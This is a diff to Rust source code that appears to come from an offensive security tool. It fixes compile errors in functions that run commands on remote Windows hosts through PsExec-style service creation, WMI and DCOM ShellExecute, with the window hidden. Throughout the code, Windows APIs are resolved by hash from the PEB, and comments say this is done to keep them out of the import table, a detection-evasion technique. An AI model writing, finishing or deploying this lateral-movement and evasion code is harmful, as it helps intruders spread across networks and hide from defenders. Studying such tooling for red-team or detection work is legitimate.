@@ -25,6 +25,7 @@ const RPC_C_AUTHZ_NONE: u32 = 0;
 const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
 const RPC_C_AUTHN_WINNT: u32 = 10;
 const CLSCTX_REMOTE_SERVER: u32 = 0x10;
+const SEC_WINNT_AUTH_IDENTITY_UNICODE: u32 = 0x2;
 
 // ── pe_resolve helpers ──────────────────────────────────────────────────
 
@@ -48,7 +49,7 @@ unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) 
             if m.is_null() {
                 return Err(anyhow!("LoadLibraryW failed for DLL (hash 0x{:08X})", dll_hash));
             }
-            m
+            m as usize
         }
     };
     let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)
@@ -59,14 +60,17 @@ unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) 
 use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
 
 // DLL wide names and hashes (not in pe_resolve build.rs).
+const OLE32_DLL_NAME_W: &[u16] = &['o' as u16, 'l' as u16, 'e' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
 const OLE32_DLL_W: &[u16] = &['o' as u16, 'l' as u16, 'e' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
-const HASH_OLE32_DLL: u32 = hash_wstr_const(&OLE32_DLL_W[..OLE32_DLL_W.len() - 1]);
+const HASH_OLE32_DLL: u32 = hash_wstr_const(OLE32_DLL_NAME_W);
 
+const ADVAPI32_DLL_NAME_W: &[u16] = &['a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
 const ADVAPI32_DLL_W: &[u16] = &['a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
-const HASH_ADVAPI32_DLL: u32 = hash_wstr_const(&ADVAPI32_DLL_W[..ADVAPI32_DLL_W.len() - 1]);
+const HASH_ADVAPI32_DLL: u32 = hash_wstr_const(ADVAPI32_DLL_NAME_W);
 
+const MPR_DLL_NAME_W: &[u16] = &['m' as u16, 'p' as u16, 'r' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
 const MPR_DLL_W: &[u16] = &['m' as u16, 'p' as u16, 'r' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
-const HASH_MPR_DLL: u32 = hash_wstr_const(&MPR_DLL_W[..MPR_DLL_W.len() - 1]);
+const HASH_MPR_DLL: u32 = hash_wstr_const(MPR_DLL_NAME_W);
 
 // API name hashes.
 const HASH_COINITIALIZEEX: u32 = hash_str_const(b"CoInitializeEx\0");
@@ -95,7 +99,7 @@ type FnCoInitializeSecurity = unsafe extern "system" fn(
 ) -> i32;
 type FnCoSetProxyBlanket = unsafe extern "system" fn(
     *mut winapi::um::unknwnbase::IUnknown, u32, u32, *mut u16, u32, u32,
-    *mut winapi::um::objidl::COAUTHIDENTITY, u32,
+    *mut winapi::shared::wtypesbase::COAUTHIDENTITY, u32,
 ) -> i32;
 type FnGetLastError = unsafe extern "system" fn() -> u32;
 type FnWNetAddConnection2W = unsafe extern "system" fn(
@@ -106,7 +110,9 @@ type FnWNetCancelConnection2W = unsafe extern "system" fn(*const u16, u32, i32) 
 // ── Function pointer types (advapi32 — SCM) ────────────────────────────────
 type FnOpenSCManagerW = unsafe extern "system" fn(*const u16, *const u16, u32) -> *mut std::ffi::c_void;
 type FnCreateServiceW = unsafe extern "system" fn(
-    *mut std::ffi::c_void,     // hSCManager
+    *mut std::ffi::c_void,      // hSCManager
+    *const u16,                 // lpServiceName
+    *const u16,                 // lpDisplayName
     u32,                        // dwDesiredAccess
     u32,                        // dwServiceType
     u32,                        // dwStartType
@@ -117,7 +123,6 @@ type FnCreateServiceW = unsafe extern "system" fn(
     *const u16,                 // lpDependencies
     *const u16,                 // lpServiceStartName
     *const u16,                 // lpPassword
-    *const u16,                 // lpDisplayName
 ) -> *mut std::ffi::c_void;
 type FnStartServiceW = unsafe extern "system" fn(*mut std::ffi::c_void, u32, *const u16) -> i32;
 type FnDeleteService = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
@@ -226,31 +231,31 @@ pub fn psexec_exec(
 ) -> Result<String> {
     // ── Resolve all SCM functions at runtime (no IAT entries) ───────────
     let fn_open_scm: FnOpenSCManagerW = unsafe {
-        resolve_api_or_load(HASH_ADVAPI32_DLL, ADVAPI32_DLL_W, HASH_OPENSCMANAGERW)
+        resolve_api_or_load(ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_OPENSCMANAGERW)
             .expect("OpenSCManagerW resolution failed")
     };
     let fn_create_svc: FnCreateServiceW = unsafe {
-        resolve_api_or_load(HASH_ADVAPI32_DLL, ADVAPI32_DLL_W, HASH_CREATESERVICEW)
+        resolve_api_or_load(ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_CREATESERVICEW)
             .expect("CreateServiceW resolution failed")
     };
     let fn_start_svc: FnStartServiceW = unsafe {
-        resolve_api_or_load(HASH_ADVAPI32_DLL, ADVAPI32_DLL_W, HASH_STARTSERVICEW)
+        resolve_api_or_load(ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_STARTSERVICEW)
             .expect("StartServiceW resolution failed")
     };
     let fn_delete_svc: FnDeleteService = unsafe {
-        resolve_api_or_load(HASH_ADVAPI32_DLL, ADVAPI32_DLL_W, HASH_DELETESERVICE)
+        resolve_api_or_load(ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_DELETESERVICE)
             .expect("DeleteService resolution failed")
     };
     let fn_close_handle: FnCloseServiceHandle = unsafe {
-        resolve_api_or_load(HASH_ADVAPI32_DLL, ADVAPI32_DLL_W, HASH_CLOSESERVICEHANDLE)
+        resolve_api_or_load(ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_CLOSESERVICEHANDLE)
             .expect("CloseServiceHandle resolution failed")
     };
     let fn_open_svc: FnOpenServiceW = unsafe {
-        resolve_api_or_load(HASH_ADVAPI32_DLL, ADVAPI32_DLL_W, HASH_OPENSERVICEW)
+        resolve_api_or_load(ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_OPENSERVICEW)
             .expect("OpenServiceW resolution failed")
     };
     let fn_query_status: FnQueryServiceStatus = unsafe {
-        resolve_api_or_load(HASH_ADVAPI32_DLL, ADVAPI32_DLL_W, HASH_QUERYSERVICESTATUS)
+        resolve_api_or_load(ADVAPI32_DLL_W, HASH_ADVAPI32_DLL, HASH_QUERYSERVICESTATUS)
             .expect("QueryServiceStatus resolution failed")
     };
 
@@ -558,12 +563,12 @@ pub fn wmi_exec(
     password: Option<&str>,
 ) -> Result<String> {
     // Resolve CoCreateInstance via pe_resolve (avoid IAT entry for ole32).
-    let ole32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ole32.dll\0"))
+    let ole32 = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ole32.dll\0")) }
         .context("ole32.dll not found in PEB")?;
-    let co_create_instance_addr = pe_resolve::get_proc_address_by_hash(
+    let co_create_instance_addr = unsafe { pe_resolve::get_proc_address_by_hash(
         ole32,
         pe_resolve::hash_str(b"CoCreateInstance\0"),
-    ).context("CoCreateInstance not found in ole32")?;
+    ) }.context("CoCreateInstance not found in ole32")?;
     let co_create_instance: unsafe extern "system" fn(
         REFIID, *mut IUnknown, u32, REFIID, *mut *mut std::ffi::c_void,
     ) -> HRESULT = unsafe { std::mem::transmute(co_create_instance_addr) };
@@ -804,9 +809,9 @@ struct IDispatch {
 
 /// Build a `COSERVERINFO` structure targeting the remote host.
 /// Returns (COSERVERINFO, wide_name_vec) — the Vec must outlive the info.
-fn build_co_server_info(host: &str) -> (winapi::um::objidl::COSERVERINFO, Vec<u16>) {
+fn build_co_server_info(host: &str) -> (winapi::um::objidlbase::COSERVERINFO, Vec<u16>) {
     let name_w = wide(host);
-    let mut info: winapi::um::objidl::COSERVERINFO = unsafe { std::mem::zeroed() };
+    let mut info: winapi::um::objidlbase::COSERVERINFO = unsafe { std::mem::zeroed() };
     info.pwszName = name_w.as_ptr() as *mut _;
     (info, name_w)
 }
@@ -827,19 +832,19 @@ pub fn dcom_exec(
     password: Option<&str>,
 ) -> Result<String> {
     // Resolve CoCreateInstanceEx via pe_resolve.
-    let ole32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ole32.dll\0"))
+    let ole32 = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ole32.dll\0")) }
         .context("ole32.dll not found in PEB")?;
-    let co_create_instance_ex_addr = pe_resolve::get_proc_address_by_hash(
+    let co_create_instance_ex_addr = unsafe { pe_resolve::get_proc_address_by_hash(
         ole32,
         pe_resolve::hash_str(b"CoCreateInstanceEx\0"),
-    ).context("CoCreateInstanceEx not found in ole32")?;
+    ) }.context("CoCreateInstanceEx not found in ole32")?;
     let co_create_instance_ex: unsafe extern "system" fn(
         REFIID,
         *mut IUnknown,
         u32,
-        *mut winapi::um::objidl::COSERVERINFO,
+        *mut winapi::um::objidlbase::COSERVERINFO,
         u32,
-        *mut winapi::um::combaseapi::MULTI_QI,
+        *mut winapi::um::objidlbase::MULTI_QI,
     ) -> HRESULT = unsafe { std::mem::transmute(co_create_instance_ex_addr) };
 
     let _com = ComGuard::new();
@@ -868,7 +873,7 @@ pub fn dcom_exec(
 
     // If credentials are provided, set up COAUTHIDENTITY in the server info.
     let (mut auth_identity, _user_w, _pass_w, _domain_w) = if let (Some(user), Some(pass)) = (username, password) {
-        let mut identity: winapi::um::objidl::COAUTHIDENTITY = unsafe { std::mem::zeroed() };
+        let mut identity: winapi::shared::wtypesbase::COAUTHIDENTITY = unsafe { std::mem::zeroed() };
         let user_wide: Vec<u16> = user.encode_utf16().collect();
         let pass_wide: Vec<u16> = pass.encode_utf16().collect();
         // If user is "DOMAIN\user" format, split it.
@@ -890,10 +895,10 @@ pub fn dcom_exec(
         identity.UserLength = user_part_owned.len() as u32;
         identity.Password = pass_wide.as_ptr() as *mut _;
         identity.PasswordLength = pass_wide.len() as u32;
-        identity.Flags = winapi::um::winnt::SEC_WINNT_AUTH_IDENTITY_UNICODE;
+        identity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
 
         // Set up COAUTHINFO
-        let mut auth_info: winapi::um::objidl::COAUTHINFO = unsafe { std::mem::zeroed() };
+        let mut auth_info: winapi::shared::wtypesbase::COAUTHINFO = unsafe { std::mem::zeroed() };
         auth_info.dwAuthnSvc = RPC_C_AUTHN_WINNT;
         auth_info.dwAuthzSvc = RPC_C_AUTHZ_NONE;
         auth_info.pwszServerPrincName = ptr::null_mut();
@@ -906,11 +911,11 @@ pub fn dcom_exec(
         (identity, user_part_owned, pass_wide, domain_wide)
     } else {
         let empty: Vec<u16> = Vec::new();
-        unsafe { std::mem::zeroed::<winapi::um::objidl::COAUTHIDENTITY>() }
+        unsafe { std::mem::zeroed::<winapi::shared::wtypesbase::COAUTHIDENTITY>() };
         (unsafe { std::mem::zeroed() }, empty.clone(), empty.clone(), empty)
     };
 
-    let mut mq: winapi::um::combaseapi::MULTI_QI = unsafe { std::mem::zeroed() };
+    let mut mq: winapi::um::objidlbase::MULTI_QI = unsafe { std::mem::zeroed() };
     mq.pIID = &IID_IDISPATCH as *const _ as *const _;
 
     let hr = unsafe {
@@ -982,20 +987,30 @@ pub fn dcom_exec(
 
     // Build the DISPPARAMS: positional args are passed in reverse order.
     let mut var_cmd: VARIANT = unsafe { std::mem::zeroed() };
-    var_cmd.n1.n2_mut().vt = VT_BSTR;
-    *var_cmd.n1.n2_mut().n3.bstrVal_mut() = args_bstr;   // index 0 = Args
+    unsafe {
+        var_cmd.n1.n2_mut().vt = VT_BSTR;
+        *var_cmd.n1.n2_mut().n3.bstrVal_mut() = args_bstr; // index 0 = Args
+    }
     let mut var_dir: VARIANT = unsafe { std::mem::zeroed() };
-    var_dir.n1.n2_mut().vt = VT_BSTR;
-    *var_dir.n1.n2_mut().n3.bstrVal_mut() = empty_bstr;  // index 1 = Dir (empty)
+    unsafe {
+        var_dir.n1.n2_mut().vt = VT_BSTR;
+        *var_dir.n1.n2_mut().n3.bstrVal_mut() = empty_bstr; // index 1 = Dir (empty)
+    }
     let mut var_op: VARIANT = unsafe { std::mem::zeroed() };
-    var_op.n1.n2_mut().vt = VT_BSTR;
-    *var_op.n1.n2_mut().n3.bstrVal_mut() = open_bstr;    // index 2 = Operation
+    unsafe {
+        var_op.n1.n2_mut().vt = VT_BSTR;
+        *var_op.n1.n2_mut().n3.bstrVal_mut() = open_bstr; // index 2 = Operation
+    }
     let mut var_show: VARIANT = unsafe { std::mem::zeroed() };
-    var_show.n1.n2_mut().vt = VT_I4;
-    *var_show.n1.n2_mut().n3.lVal_mut() = 0;             // index 3 = Show (0 = SW_HIDE)
+    unsafe {
+        var_show.n1.n2_mut().vt = VT_I4;
+        *var_show.n1.n2_mut().n3.lVal_mut() = 0; // index 3 = Show (0 = SW_HIDE)
+    }
     let mut var_file: VARIANT = unsafe { std::mem::zeroed() };
-    var_file.n1.n2_mut().vt = VT_BSTR;
-    *var_file.n1.n2_mut().n3.bstrVal_mut() = cmd_bstr;   // index 4 = File
+    unsafe {
+        var_file.n1.n2_mut().vt = VT_BSTR;
+        *var_file.n1.n2_mut().n3.bstrVal_mut() = cmd_bstr; // index 4 = File
+    }
 
     // DISPPARAMS: args in reverse order (right-to-left for positional).
     #[repr(C)]
